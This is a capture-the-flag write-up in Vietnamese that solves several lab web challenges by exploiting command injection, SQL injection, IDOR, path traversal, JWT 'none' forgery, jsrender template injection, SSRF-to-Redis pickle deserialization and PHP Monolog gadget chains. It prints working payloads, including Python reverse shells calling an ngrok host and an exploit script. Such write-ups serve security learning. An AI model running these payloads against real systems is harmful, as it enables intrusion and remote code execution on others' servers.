## Trapped Source
View source HTML của trang ta sẽ thấy đoạn JS sau:
```html
<script>
    window.CONFIG = window.CONFIG || {
        buildNumber: "v20190816",
        debug: false,
        modelName: "Valencia",
        correctPin: "8291",
    }
</script>
```

có được `correctPin` là 8291, bấm đúng số đó vào cái máy ta được flag, f12 lên copy flag rồi submit

## Gunhead
Trên web có một chức năng giúp ta chạy các lệnh, một trong các lệnh đó là /ping \<ip\>, đọc source phía server đầu tiên ta thấy có route đến `/api/ping`
```php
$router->new('POST', '/api/ping', 'ReconController@ping');
```
Tiếp tục tìm đến ReconController trong file `ReconController.php` thấy hàm này tiếp tục gọi đến class `ReconModel` và truyền IP lúc nãy vào constructor và gọi method `getOutput` của nó
```php
$pingResult = new ReconModel($jsonBody['ip']);

return $router->jsonify(['output' => $pingResult->getOutput()]);
```
Đi đến `ReconModel` trong file `ReconModel.php`, tại đây ta thấy bên trong constructor là đang gán tham số `$ip` vào thuộc tính `ip` của class, method `getOutput` thực hiện nhiệm vụ chạy lệnh `ping -c 3 <ip>`, nhận thấy \<ip\> là data mà ta kiểm soát, không có lớp lọc nào => OS Command Injection

Thêm một dấu `;` để kết thúc lệnh trước, từ đây ta có thể chạy lệnh tùy ý
```
> /ping a;cat /*.txt
```
![](https://i.imgur.com/clsznAm.png)

## Drobot
Chức năng đầu tiên đập vào mắt là login, vào file `routes.py` -- nơi chứa các routing của web, sẽ thấy nó đang gọi đến hàm `login` trong `database.py`
```python 
@api.route('/login', methods=['POST'])
def apiLogin():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    if not username or not password:
        return response('All fields are required!'), 401
    
    user = login(username, password) # <===== HERE
    
    if user:
        session['auth'] = user
        return response('Success'), 200
        
    return response('Invalid credentials!'), 403
```
Vào `database.py`, tại hàm `login`, thấy username và password truyền vào được đưa trực tiếp vào câu query để đưa đến database, không có santinize, không có parameterize => SQL Injection, dựa vào các routes ta biết chỉ cần login vào là có flag

```
username: admin" or 1=1-- -
password: a
```

Câu query lúc này sẽ thành:
```
SELECT password FROM users WHERE username = "admin" or 1=1-- -" AND password = "a"
```

Dấu `-- ` sẽ biến đoạn sau thành comment. Login vào ta có được flag
```
HTB{p4r4m3t3r1z4t10n_1s_1mp0rt4nt!!!}
```

## Passman
Bài này dùng graphql để call tới API, xem kỹ tất cả type trong file `GraphqlHelper.js` thì gần như đều kiểm tra xem đã login chưa, tuy nhiên lại không kiểm tra xem user đã login là user gì, cụ thể là ở field `UpdatePassword`, do không kiểm tra user đang đăng nhập và user sắp thay đổi có giống nhau hay không nên ta có thể lợi dụng để update password của bất kì user nào sau khi login => Lỗi IDOR.

Nhìn vào file `entrypoint.sh` sẽ thấy trong phrases của admin sẽ có flag, ta sẽ lợi dụng bug trên để update password của admin và vào đọc flag

Đầu tiên là tạo một account rồi login vào, sau đó gửi request Graphql để update password:
```http!
POST /graphql HTTP/1.1
Host: 159.65.81.51:31318
Content-Length: 183
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://159.65.81.51:31318
Referer: http://159.65.81.51:31318/register
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFhIiwiaXNfYWRtaW4iOjAsImlhdCI6MTY3OTU1Nzc4N30.yFyqY8lBZdG_x4cTqdf4EprgTQRQJfduMpp7w4qBdW8

{"query":"mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message } }","variables":{"username":"admin","password":"123"}}
```

response:
```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 72
Date: Thu, 23 Mar 2023 07:50:18 GMT
Connection: close

{"data":{"UpdatePassword":{"message":"Password updated successfully!"}}}
```

Login vào với account `admin:123`

`HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}`

## Orbital
Đầu tiên là lỗi SQL Injection tại chức năng login, ta có thể tìm thấy đoạn code xử lý tại file `database.py`
```python
def login(username, password):
    # I don't think it's not possible to bypass login because I'm verifying the password later.
    user = query(f'SELECT username, password FROM users WHERE username = "{username}"', one=True)

    if user:
        passwordCheck = passwordVerify(user['password'], password)

        if passwordCheck:
            token = createJWT(user['username'])
            return token
    else:
        return False
```

username được nối trực tiếp vào câu query => giống bài Drobots

Tuy nhiên lần này password không được nối vào query mà được dùng để so sánh, ta có thể khiến câu select thứ nhất trả về null, rồi dùng cấu trúc UNION để nối kết quả 2 bảng lại với nhau, vì câu trước trả về NULL, câu sau thì do ta inject thêm vào nên ta sẽ kiểm soát được kết quả trả về của cả câu query

```
username: anhchangyeuem" UNION SELECT "admin","202cb962ac59075b964b07152d234b70
password: 123
```
`202cb962ac59075b964b07152d234b70` là md5 của 123 vì lát nữa hàm `passwordVerify` sẽ check bằng cách lấy md5 của input password so với kết quả trả về 

Câu query thành:

```sql 
SELECT username, password FROM users WHERE username = "anhchangyeuem" UNION SELECT "admin","202cb962ac59075b964b07152d234b70"
```

Lúc này thì vì password sẽ trả về là 123, password nhập vào cũng là 123 nên ta sẽ pass qua login

Đến phần sau ta để ý route `/export`:
```
def exportFile():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    communicationName = data.get('name', '')

    try:
        # Everyone is saying I should escape specific characters in the filename. I don't know why.
        return send_file(f'/communications/{communicationName}', as_attachment=True)
    except:
        return response('Unable to retrieve the communication'), 400

```

Ở đây send_file được sử dụng để trả một file từ server về, thêm việc `communicationName` là data mà ta kiểm soát nên ta có thể làm nó trả về một file tùy ý => Path traversal

```http!
POST /api/export HTTP/1.1
Host: 64.227.41.83:32154
Content-Length: 36
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept: */*
Origin: http://64.227.41.83:32154
Referer: http://64.227.41.83:32154/home
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJhdXRoIjoiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFjMlZ5Ym1GdFpTSTZJbUZrYldsdUlpd2laWGh3SWpveE5qYzVOVGd3TWpFd2ZRLk5GdUkybjkta1hVUWJQdTF6NC1BTTRCcDQzRWRuSmZnaFE2aHdhUE8ySWsifQ.ZBwH0g.-e4yJNL7-HvreEhBxlEwAavZsRY
Connection: close

{"name":"../signal_sleuth_firmware"}
```
Trong file docker thì flag.txt được đổi tên thành "signal_sleuth_firmware" tại root `/`
```
HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}
```
p/s: hình như intend bài này là timebased hay sao ấy :V

## Didactic Octo Paddles
Đến những bài này ta sẽ đi thẳng vào vấn đề luôn.

Trong các middleware được sử dụng cho các route thì endpoint `/admin` sẽ được sử dụng middleware riêng là `AdminMiddleware`, ở đây chứa logic sử dụng JWT 

Đầu tiên JWT sẽ được decode ra thành object, rồi sau đó đưa vào if else để check thuật toán alg được sử dụng

Để ý phần check `decoded.header.alg == 'none'`, ở đây code đang không muốn ta sử dụng thuật toán `none`, do nếu sử dụng thuật toán này thì khi verify sẽ luôn trả về đúng. Tuy nhiên header `alg` của JWT không chỉ chấp nhận giá trị `none` mà còn chấp nhận các giá trị như `NONE`, `None`, `NoNe`. Việc chỉ so với chuỗi `none` là chưa đủ, dẫn đến ta có thể chỉnh JWT, đổi alg thành `NONE` và sử `id` thành 1

Vì sao lại là 1, là vì ở đây JWT sẽ sign giá trị `id` là dùng nó để xác định user, nhìn trong file `database.js` sẽ thấy giá trị `id` của `Users` được gán `autoIncrement: true` nghĩa là tự tăng dần, bên dưới tại `Database.create` sẽ tạo user `admin`. Vậy suy ra user đầu tiên là `admin` nên sẽ mang giá trị `id` là 1 

Tại đây có thể dùng JWT_tool: `python jwt_tool.py -X a eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNjc5NTYzODU4LCJleHAiOjE2Nzk1Njc0NTh9.RAhPvgjaaLxt7gwrsOsfclGX7RKWfzOZL8g2ZMlXA6Y`

Craft JWT ta được:
```
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiaWF0IjoxNjc5NTYwOTYwLCJleHAiOjE2Nzk1NjQ1NjB9.
```

Giờ đến phần sau, ta để ý đoạn code trong route `/admin`:
```javascript 
const users = await db.Users.findAll();
const usernames = users.map((user) => user.username);

res.render("admin", {
    users: jsrender.templates(`${usernames}`).render(),
});
```
Ta thấy code sẽ lấy tất cả user trong database rồi đưa vào `usernames`, sau đó truyền vào trực tiếp vào `jsrender.templates`. Đọc document về `jsrender.templates()`:

![](https://i.imgur.com/rFyRdby.png)

Đại khái thì ta có thể truyền các Template Expressions vào đây => SSTI

Tạo một user mới với tên là payload để đọc `/flag.txt`:
```
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()")()}}
```

![](https://i.imgur.com/bcvPkyf.png)

## TrapTrack

Ở bài này sau khi đọc source code, ta sẽ thấy thông tin login của admin ở file `challenge/application/config.py`
```python 
class Config(object):
    SECRET_KEY = generate(50)
    ADMIN_USERNAME = 'admin'
    ADMIN_PASSWORD = 'admin'
    SESSION_PERMANENT = False
    SESSION_TYPE = 'filesystem'
    SQLALCHEMY_DATABASE_URI = 'sqlite:////tmp/database.db'
    REDIS_HOST = '127.0.0.1'
    REDIS_PORT = 6379
    REDIS_JOBS = 'jobs'
    REDIS_QUEUE = 'jobqueue'
    REDIS_NUM_JOBS = 100
```
Login bằng credentials này ta vào được trang quản trị

Đây là một ứng dụng sử dụng Redis làm database, ứng dụng sẽ cho ta add các url vào và check xem nó có truy cập được không.

Mỗi khi ta add một traptracks, app sẽ query đến redis để `HSET` vào `jobs` để set một record với key là job_id và value là `data` được serialize bằng `pickle`. Sau đó app cũng `rpush` cái `job_id` vào `REDIS_QUEUE`:
```python
def create_job_queue(trapName, trapURL):
    job_id = get_job_id()

    data = {
        'job_id': int(job_id),
        'trap_name': trapName,
        'trap_url': trapURL,
        'completed': 0,
        'inprogress': 0,
        'health': 0
    }

    current_app.redis.hset(env('REDIS_JOBS'), job_id, base64.b64encode(pickle.dumps(data)))

    current_app.redis.rpush(env('REDIS_QUEUE'), job_id)

    return data
```

Vì có dùng pickle để serialize thì hẳn phải gọi đến `pickle.loads` để deserialize ở một nơi nào đó. `pickle.loads` được gọi trong hàm `get_job_queue`:
```python
def get_job_queue(job_id):
    data = current_app.redis.hget(env('REDIS_JOBS'), job_id)
    if data:
        return pickle.loads(base64.b64decode(data))

    return None

```

Hàm `get_job_queue` thì được gọi ở route `/tracks/<int:job_id>/status`

Một nơi khác cũng gọi đến `pickle.loads` là `get_work_item`
```python 
def get_work_item():
    job_id = store.rpop(env('REDIS_QUEUE'))
    if not job_id:
        return False

    data = store.hget(env('REDIS_JOBS'), job_id)

    job = pickle.loads(base64.b64decode(data))
    return job
```

`get_work_item` được gọi bởi `run_worker`, `run_worker` được chạy mỗi 10s

tại cả 2 chỗ đều lấy đoạn data này ra để đưa vào `pickle.loads`:
```python
data = {
    'job_id': int(job_id),
    'trap_name': trapName,
    'trap_url': trapURL,
    'completed': 0,
    'inprogress': 0,
    'health': 0
}
```

Vấn đề ở đây là ta không kiểm soát được toàn bộ nó mà chỉ kiểm soát được một vài phần thôi. Tuy nhiên có 2 thứ ta có thể lợi dụng:
- hàm `request` sẽ gửi request đến một url bất kì mà không kiểm tra (SSRF)
- Redis là một text protocol, ta có thể lợi dụng các protocol như `dict` hay `gopher` để tương tác với nó

Vậy ta có thể dùng SSRF để đưa payload đến Redis rồi để app deserialize với `pickle.loads`

```!
dict://127.0.0.1:6379/HSET:jobs:130:"gASV7AAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjNFweXRob24gLWMgJ2ltcG9ydCBzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjAudGNwLmFwLm5ncm9rLmlvIiwxMjEwNCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3B0eS5zcGF3bigiL2Jpbi9zaCIpJ5SFlFKULg=="
```
Sau khi `request` được chạy thì một record mới chứa payload và job_id là 130 sẽ xuất hiện trong redis. Tiếp theo là:

```
dict://127.0.0.1:6379/RPUSH:jobqueue:"130"
```


Lệnh trên sẽ đưa job_id 130 vào jobqueue, sau 10s thì `request` sẽ được chạy và thực thi lệnh trên, lúc đó thì job_id `130` sẽ nằm trên đỉnh, sau khi `rpop` ra thì nó sẽ dùng `HGET` tìm tới id `130` trong `jobs`.

Sau khi truy cập vào endpoint `/api/tracks/130/status` thì payload sẽ được trigger và ta sẽ có được reverse shell. Ngoài ra thì vào lúc mà `get_work_item` chạy thì cũng sẽ gọi `pickle.loads` và ta cũng sẽ có được reverse shell

```
HTB{tr4p_qu3u3d_t0_rc3!}
```

## UnEarthly Shop
Web chia làm 2 phần là frontend và backend, cùng server

Sài thử web thì có một request sau:
```http
POST /api/products HTTP/1.1
Host: 178.62.9.10:30498
Content-Length: 29
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://178.62.9.10:30498
Referer: http://178.62.9.10:30498/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

[{"$match":{"instock":true}}]
```
Ứng dụng sài mongo, vậy thay vì `$match` thì ta có thể sử dụng một aggregation operator khác để làm gì đó hay hay. 

https://www.mongodb.com/docs/v6.0/reference/operator/aggregation/lookup/
Đọc document sẽ tìm lấy `$lookup` giúp ta tìm kiếm data trong một collection khác

```http
POST /api/products HTTP/1.1
Host: 178.62.9.10:30498
Content-Length: 87
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://178.62.9.10:30498
Referer: http://178.62.9.10:30498/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

[{"$lookup":
{
    "from":"users",
    "localField":"_id",
    "foreignField":"_id",
    "as":"aaa"
}
}]
```
Ta sẽ nhận về được kết quả có chứa đoạn sau
```
"aaa":[{"_id":1,"username":"admin","password":"AmqKVZr1kEyeuJsF","access":"a:4:{s:9:\"Dashboard\";b:1;s:7:\"Product\";b:1;s:5:\"Order\";b:1;s:4:\"User\";b:1;}"}]
```
```
admin:AmqKVZr1kEyeuJsF
```
Trùng hợp là cả users và products đều có _id và _id đều có số 1 nên cách này mới thành công

Vào được admin, ta đọc code bên backend sẽ để ý thấy sink `unserialize`, thấy có điềm rồi.

```php
$this->access   = unserialize($_SESSION['access'] ?? '');
```

Để ý ta có thể update password, tuy nhiên endpoint này ta có thể lợi dụng để update bất cứ trường nào chứ không riêng password vì đoạn JSON ta truyền vào được pass hết vào `update()`:
```php
$this->database->update('users', $data['_id'], $data);
```

Vậy idea sẽ là update password với một đoạn PHP payload được serialized để RCE đọc flag, tuy nhiên là source code chính của web ta sẽ không tìm thấy gadget nào, ta sẽ bắt đầu tìm kiếm gadget ở các package mà web sử dụng.

Qua tìm kiếm ta sẽ có được 2 gadget tiềm năng trong PHPGGC là `Guzzle/FW1` và `Monolog/RCE7`. Tuy nhiên khi thử thì `Guzzle/FW1` sẽ fail vì ta không có quyền ghi file, test `Monolog/RCE7` thì thấy nó hoạt động tốt, nhưng vấn đề là bây giờ bên `backend` và `frontend` đều có autoload riêng, làm sao để ta reach được gadget `monolog` bên frontend đây?

Để ý hàm `spl_autoload_register`, đây là hàm được chạy tự động khi ta cố gắng load một class, phần code sau cho thấy hàm sẽ cố gắng include file với tên của class đang load nếu như nó tồn tại:
```php 
if (file_exists($filename)) {
    require $filename;
}
```
Vậy nếu ta load một class là `www_frontend_vendor_autoload` thì file autoload.php của frontend sẽ được gọi và ta có thể load được class của `monolog`.

Vấn đề tiếp theo là làm sao vừa include file autoload, vừa load class của monolog. Dựa theo ý tưởng là bài viết [này](https://www.ambionics.io/blog/vbulletin-unserializable-but-unreachable) thì ta có thể dùng một array, do khi include được file autoload thì lại không có class nào tên `www_frontend_vendor_autoload` cả nên nó sẽ trả về một `__PHP_Incomplete_Class`, nhưng mấu chốt là nó không bị crash, do đó tại index tiếp theo của array ta có thể load tiếp class từ `monolog` và RCE

```!
a:2:{i:0;O:28:"www_frontend_vendor_autoload":0:{}i:1;O:37:"Monolog\Handler\FingersCrossedHandler":4:{s:16:"\u0000*\u0000passthruLevel";i:0;s:10:"\u0000*\u0000handler";r:3;s:9:"\u0000*\u0000buffer";a:1:{i:0;a:2:{i:0;s:209:"python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ap.ngrok.io",12104));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'";s:5:"level";i:0;}}s:13:"*processors";a:2:{i:0;s:3:"pos";i:1;s:6:"system";}}}
```

Payload này mình craft tay, chỉ có monolog là gen từ phpggc :V để ý phần `r:3`, đoạn này ban đầu nó là `r:1` nhưng khi đưa vào array thì nó thành 3 để point vào object hiện tại là monolog

Store payload kia trong file rồi viết một đoạn script gửi lên:
```python
import requests

url = "http://138.68.162.218:31396/admin/api/users/update"
with open("./expl.txt") as f:
	r = requests.post(url, json={
		"_id": 1,
		"username": "admin",
		"password": "aaa",
		"access": f.read()
	}, headers={"Cookie":"PHPSESSID=s84akbvbta03voi5mcee8aop1o"})
	print(r.text)
```

Gửi xong ta logout ra và login lại để trigger đoạn `unserialize`

```
HTB{l00kup_4r7if4c75_4nd_4u70lo4d_g4dg37s}
```
